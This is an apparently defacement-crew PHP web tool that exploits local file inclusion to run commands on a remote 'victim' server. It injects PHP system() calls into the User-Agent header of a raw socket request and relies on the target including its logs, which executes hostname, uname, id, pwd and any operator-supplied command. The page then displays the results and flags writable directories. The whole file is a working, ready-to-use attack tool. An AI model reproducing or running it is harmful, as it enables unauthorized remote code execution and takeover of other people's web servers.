<style>
body {
    background: #000;
    color: #CFCFCF;
    font-family: 'Times New Roman';
}
input {
    border: 1px solid #000;
    background: #000;
    color: #CFCFCF;
}
pre {
    font-size: 10pt;
}
hr {
    width: 100%;
}
td {
    border: 1px outset #454545;
    background: #454545;
    font-size: 9pt;
    padding: 2px;
    padding-left: 5px;
    font-family: verdana;
}
</style>
<title>###[ LFI Remote Command Execution By XTERM  -E-X-P-L-O-R-E- -C-R-E-W- w3 4r3 th3 4nk3r t34m ]###</title>
<body>

<table border=0 width=860 align=center><tr><Td><center><p style="font-size: 18pt;"><b>- E - X - P - L - O - R - E -   - C - R - E - W -</b><br>
- = = = w3 4r3 th3 4nk3r t34m = = = -

<B>=[ LFI Remote Command Execution ]=</b></td></tr></center>
</table>
<?php
if($_POST['injek']):
    $sasaran= str_replace("http://","",$_POST['host']);
    $sp     = explode("/",$sasaran);
    $victim    = $sp[0];
    $port    = 80; 
    $inject    = str_replace($victim,"",$sasaran);
    $command  = "XHOSTNAME<?php echo system('hostname;echo  ;'); ?>XHOSTNAME";
    $command .= "XSIP<?php echo \$_SERVER['SERVER_ADDR']; ?>XSIP";
    $command .= "XUNAME<?php echo system('uname -a;echo  ;'); ?>XUNAME";
    $command .= "XUSERID<?php echo system('id;echo  ;'); ?>XUSERID";
    $command .= "XPWD<?php echo system('pwd;echo  ;'); ?>XPWD";
    $command .= "XPHP<?php echo phpversion(); ?>XPHP";
    if($_POST['cwd']){
    $command .= "XCWD<?php chdir('".$_POST['cwd']."'); ?>XCWD";
    }
    $command .= "EXPLORE<pre><?php echo system('".$_POST['cmd']."; echo    ; exit;'); ?></pre>EXPLORE";
    
    if(eregi(":",$victim)){
        $vp = explode(":",$victim);
        $victim = $vp[0];
        $port    = $vp[1];
    }

    $sock = fsockopen($victim,$port,$errno,$errstr,30);
    if ($sock) {
        $get  = "GET ".$inject." HTTP/1.1\r\n".
                "Host: ".$victim."\r\n".
                "Accept: */*\r\n".
                "User-Agent: Mozilla/5.0 ".$command."\r\n".
                "Connection: Close\r\n\r\n";
        fputs($sock,$get);        
        while (!feof($sock)) {
            $output .= trim(fgets($sock, 3600000))."\n";            
        }
        fclose($sock);
    }
    $hostp     = explode("XHOSTNAME",$output); $hostname = $hostp[1];
    $ipp    = explode("XSIP",$output); $ip = $ipp[1];
    $unamep    = explode("XUNAME",$output); $uname = $unamep[1];
    $userp    = explode("XUSERID",$output); $userid = $userp[1];
    $currp    = explode("XPWD",$output); $current = $currp[1];
    $writes    = @is_writable($current);
    $phpvp    = explode("XPHP",$output); $phpversion = $phpvp[1];
    $hasil    = explode("EXPLORE",$output); $return = $hasil[1];
    
    
endif;
?>
<form action='<?php echo $_SERVER['PHP_SELF'] ?>' method='post'>
<table border=0 align=center width=860>
<?php if($_POST['injek']){ ?>
<tr>
    <td colspan=3> </td>
</tr>
<tr><Td><b>Hostname</b> </td><td>:</td>
    <td><?php echo $victim ?></td>
</tr>
<tr><Td><b>Nodename</b> </td><td>:</td>
    <td><?php echo $hostname ?></td>
</tr>
<tr><Td><b>IP Address</b> </td><td>:</td>
    <td><?php echo $ip ?></td>
</tr>
<tr><Td><b>Uname -a</b></td><td>:</td>
    <td><?php echo $uname ?></td>
</tr>
<tr><Td><b>User ID</b></td><td>:</td>
    <td><?php echo $userid ?></td>
</tr>
<tr><Td><b>Script Path</b></td><td>:</td>
    <td><?php echo $current; if($writes){ echo "<b>Writeable!</b>"; } ?></td>
</tr>
<tr><Td><b>PHP Version</b></td><td>:</td>
    <td><?php echo $phpversion ?></td>
</tr>
<?php } ?>
<tr>
    <td colspan=3> </td>
</tr>
<tr><Td width=130><b>Victim </b></td><td>:</td>
    <td><input type=text size=110 value='<?php echo $_POST['host'] ?>' name=host /></td>
</tr>
<?php if($_POST['injek']){ ?>
<tr><Td width=130><b>Work Directory</b></td><td>:</td>
    <td><input type=text size=110 value='<?php echo (($_POST['cwd'])?$_POST['cwd']:$current); ?>' name=cwd /></td>
</tr>
<?php } ?>
<tr><Td><b>Command </b></td><td>:</td>
    <Td><input type=text size=110 value='<?php echo $_POST['cmd']; ?>' name=cmd /></td>
</tr>
<tr><td colspan=2> </td><td><input type=submit name=injek value="Execute!" /></td></tr>
<tr>
    <td colspan=3> </td>
</tr>
</table>

<?php
if($_POST['injek']):    
    echo "<table border=0 width=860 align=center><tr><Td> <pre>".$hasil[1]."</pre></td></tr></table>";
endif;
echo "</form>";
echo "<PRE style='text-align: center; width: 100%; color: #454545'>###[ LFI Remote Command Execution By XTERM  -E-X-P-L-O-R-E- -C-R-E-W- w3 4r3 th3 4nk3r t34m ]###</pre>";
exit();
?>
